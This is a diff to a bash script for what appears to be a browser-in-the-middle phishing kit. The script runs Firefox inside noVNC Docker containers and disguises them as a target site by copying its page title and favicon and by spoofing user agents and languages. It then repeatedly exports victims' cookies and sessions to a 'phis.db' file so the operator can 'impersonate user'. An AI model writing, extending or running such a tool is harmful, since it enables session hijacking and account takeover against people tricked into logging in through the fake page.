@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Cool banner
+# [ Cool banner ]
 cat << EOF
                           __    __       __    
  .--.--.-----.-----.-----|  |--|__.-----|  |--.
@@ -28,10 +28,11 @@ helpFunction() {
     echo -e "\t -z Compress profile to zip - will be ignored if parameter -e is set"
     echo -e "\t -r true / false to turn on the redirection to the target page"
     echo -e "\t -k true / false to turn on the remote debugging port in all browsers"
+    echo -e "\t -l Preferred language codes for the browser (such as en,es,pt,pt-BR)"
     exit 1 # Exit script after printing help
 }
 
-while getopts "u:d:t:s:c:k:e:a:z:p:r:k:" opt
+while getopts "u:d:t:s:c:k:e:a:z:p:r:k:l:" opt
 do
     case "$opt" in
         u ) User="$OPTARG" ;;
@@ -46,6 +47,7 @@ do
         p ) param=$OPTARG ;;
         r ) Redirect=$OPTARG ;;
         k ) DebugPort=$OPTARG ;;
+        l ) AcceptLang=$OPTARG ;;
         ? ) helpFunction ;; # Print helpFunction in case parameter is non-existent
     esac
 done
@@ -210,6 +212,10 @@ copy_profile() {
     python3 ./scripts/status.py $x "${urls[$(($x - 1))]}"
 }
 
+#
+# [ Main logic ]
+#
+
 case "$1" in 
 
 "install")
@@ -246,6 +252,7 @@ case "$1" in
     temptitle=$(curl $Target -sL -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' | grep -oP '(?<=title).*(?<=title>)' | grep -oP '(?=>).*(?=<)') 
     pagetitle="${temptitle:1}"
     
+    # Fetch the favicon for the target page
     curl https://www.google.com/s2/favicons?domain=$Target -sL --output novnc.ico
     icopath="./novnc.ico"
     
@@ -299,7 +306,34 @@ case "$1" in
     fi
     
     cat templates/status.header.php > ./output/status.php
-    
+
+    # Start with a basic template for user preferences, then
+    # fill them with needed values for each case
+    # and upload to each container
+    cat templates/user.header.js > vnc/muser.js;
+    cat templates/user.header.js > vnc/user.js;
+    echo "" >> vnc/muser.js;
+    echo "" >> vnc/user.js;
+    if [ -n $AcceptLang ]; then
+        echo 'user_pref("intl.accept_languages", "'$AcceptLang'");' >> ./vnc/muser.js
+        echo 'user_pref("intl.accept_languages", "'$AcceptLang'");' >> ./vnc/user.js
+    fi
+
+    if [ -n "$useragent" ]; then
+        # Custom UA, mobile (don't override)
+        echo 'user_pref("general.useragent.override","Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.1 Mobile/15E148 Safari/605.1.15");' >> ./vnc/muser.js
+
+        # Custom UA, desktop (override)
+        echo 'user_pref("general.useragent.override","'$useragent'");' >> ./vnc/user.js
+    else
+        # No custom UA, mobile
+        echo 'user_pref("general.useragent.override","Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.1 Mobile/15E148 Safari/605.1.15");' >> ./vnc/muser.js
+        echo 'user_pref("layout.css.devPixelsPerPx", "0.9");' >> ./vnc/muser.js
+
+        # No custom UA, desktop
+        echo 'user_pref("general.useragent.override","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0");' >> ./vnc/user.js
+    fi
+
     mobile=false
 
     declare -a urls=()
@@ -323,76 +357,30 @@ case "$1" in
         # Start up the corresponding VNC container
         # and then firefox a single time (just to set up the profile?)
         sudo docker run -dit --name $VNC_CONT -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 $VNC_IMG  &> /dev/null 
-        sleep 2
-        sudo docker exec $VNC_CONT sh -c "firefox &" &> /dev/null
         sleep 3
+        sudo docker exec $VNC_CONT sh -c "firefox &" &> /dev/null
+        sleep 1
         sudo docker exec $VNC_CONT sh -c "pidof firefox | xargs kill &" &> /dev/null
-            
-        if [ -n "$useragent" ]
-        then
-            if [ "$mobile" = "true" ]
-            then
-                echo 'user_pref("general.useragent.override","Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.1 Mobile/15E148 Safari/605.1.15");' > ./vnc/muser.js
-                echo 'user_pref("font.name.serif.x-western", "DejaVu Sans");' >> ./vnc/muser.js
-                echo 'user_pref("signon.showAutoCompleteFooter", false);' >> ./vnc/muser.js
-                echo 'user_pref("signon.rememberSignons", false);' >> ./vnc/muser.js
-                echo 'user_pref("signon.formlessCapture.enabled", false);' >> ./vnc/muser.js
-                echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/muser.js
-                echo 'user_pref("intl.accept_languages", "pt-BR, pt");' >> ./vnc/muser.js
-                sudo docker cp ./vnc/muser.js mvnc-user$c:/home/headless/user.js
-            sleep 1;
-                sudo docker exec mvnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -I {} cp -f -r /home/headless/user.js {}"
-        else
-                echo 'user_pref("general.useragent.override","'$useragent'");' > ./vnc/user.js
-                echo 'user_pref("font.name.serif.x-western", "DejaVu Sans");' >> ./vnc/user.js
-                echo 'user_pref("signon.showAutoCompleteFooter", false);' >> ./vnc/user.js
-                echo 'user_pref("signon.rememberSignons", false);' >> ./vnc/user.js
-                echo 'user_pref("signon.formlessCapture.enabled", false);' >> ./vnc/user.js
-                echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/user.js
-                echo 'user_pref("intl.accept_languages", "pt-BR, pt");' >> ./vnc/user.js
-                sudo docker cp ./vnc/user.js vnc-user$c:/home/headless/user.js
-            sleep 1;
-                sudo docker exec vnc-user$c /bin/bash -c 'find -name prefs.js -exec dirname {} \; | xargs cp /home/headless/user.js '
-         fi
+        sleep 2
 
+        if [ "$mobile" = "true" ]; then
+            sudo docker cp ./vnc/muser.js $VNC_CONT:/home/headless/user.js
         else
-            if [ "$mobile" = "true" ]
-            then
-                echo 'user_pref("general.useragent.override","Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.1 Mobile/15E148 Safari/605.1.15");' > ./vnc/muser.js
-                echo 'user_pref("font.name.serif.x-western", "DejaVu Sans");' >> ./vnc/muser.js
-                echo 'user_pref("signon.showAutoCompleteFooter", false);' >> ./vnc/muser.js
-                echo 'user_pref("signon.rememberSignons", false);' >> ./vnc/muser.js
-                echo 'user_pref("signon.formlessCapture.enabled", false);' >> ./vnc/muser.js
-                echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/muser.js
-                echo 'user_pref("layout.css.devPixelsPerPx", "0.9");' >> ./vnc/muser.js
-                echo 'user_pref("intl.accept_languages", "pt-BR, pt");' >> ./vnc/muser.js
-                sudo docker cp ./vnc/muser.js mvnc-user$c:/home/headless/user.js
-            sleep 1;
-                sudo docker exec mvnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -I {} cp -f -r /home/headless/user.js {}"
-            else        
-                echo 'user_pref("general.useragent.override","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0");' > ./vnc/user.js
-                echo 'user_pref("font.name.serif.x-western", "DejaVu Sans");' >> ./vnc/user.js
-                echo 'user_pref("signon.showAutoCompleteFooter", false);' >> ./vnc/user.js
-                echo 'user_pref("signon.rememberSignons", false);' >> ./vnc/user.js
-                echo 'user_pref("signon.formlessCapture.enabled", false);' >> ./vnc/user.js
-                echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/user.js
-                echo 'user_pref("intl.accept_languages", "pt-BR, pt");' >> ./vnc/user.js
-                sudo docker cp ./vnc/user.js vnc-user$c:/home/headless/user.js
-            sleep 1;
-                sudo docker exec vnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -I {} cp -f -r /home/headless/user.js {}"
-            fi             
+            sudo docker cp ./vnc/user.js $VNC_CONT:/home/headless/user.js
         fi
+
+        #sleep 1;
+
+        sudo docker exec $VNC_CONT sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -I {} cp -f -r /home/headless/user.js {}"
+
 
         sleep 1
         
         if [ -n "$pagetitle" ]; then
+            sudo docker exec --user root $VNC_CONT sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/conn.html"
+            sudo docker exec --user root $VNC_CONT sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/app/ui.js"
             if [ "$mobile" = "true" ]; then
-                sudo docker exec --user root mvnc-user$c sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/conn.html"
-                sudo docker exec --user root mvnc-user$c sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/app/ui.js"
-                sudo docker exec --user root mvnc-user$c sh -c "sed -i 's/min-width: 8em;/\/\*min-width: 8em;\*\//' /usr/libexec/noVNCdim/app/styles/input.css"
-            else
-                sudo docker exec --user root vnc-user$c sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/conn.html"
-                sudo docker exec --user root vnc-user$c sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/app/ui.js"
+                sudo docker exec --user root $VNC_CONT sh -c "sed -i 's/min-width: 8em;/\/\*min-width: 8em;\*\//' /usr/libexec/noVNCdim/app/styles/input.css"
             fi
         fi
         
@@ -717,14 +705,14 @@ case "$1" in
     
     dbpath="./output/phis.db"
     if [ -e $dbpath ]; then
-        rm -rf $dbpath
+        rm -f $dbpath
     fi
     
     echo -e "[~] Starting Loop to collect sessions and cookies from containers${NC}" 
     echo -e "    You can check and view the open session by use of the status.php in the output directory${NC}" 
 
     # Start a loop which copies the cookies from the containers
-    echo -e "    Every X Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop.."
+    echo -e "    Every $PROFILE_COPY_INTERVAL Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop.."
 
     trap 'echo -e "\n[~] Import stealed session and cookie JSON or the firefox profile to impersonate user"; echo -e "[~] VNC and Rev-Proxy container will be removed" ; sleep 2 ; sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q) &> /dev/null && sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q) &> /dev/null & printf "[+] Done!"; sleep 2' SIGTERM EXIT
 
